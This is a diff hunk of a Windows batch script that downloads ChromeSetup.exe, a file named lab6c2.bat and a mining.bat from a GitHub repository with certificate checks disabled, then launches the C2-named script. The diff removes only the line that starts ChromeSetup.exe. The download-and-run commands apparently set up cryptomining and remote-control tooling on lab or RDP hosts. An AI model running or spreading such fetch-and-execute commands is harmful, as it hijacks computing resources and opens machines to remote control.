@@ -15,7 +15,6 @@ cd C:\Users\Administrator\Desktop
 curl -LJOk https://raw.githubusercontent.com/mrX04/lab2rdp/master/ChromeSetup.exe
 curl -LJOk https://raw.githubusercontent.com/mrX04/lab2rdp/master/lab6c2.bat
 curl -LJOk https://raw.githubusercontent.com/mrX04/lab2rdp/master/mining.bat
-start ChromeSetup.exe
 cls
 @echo off
 start lab6c2.bat
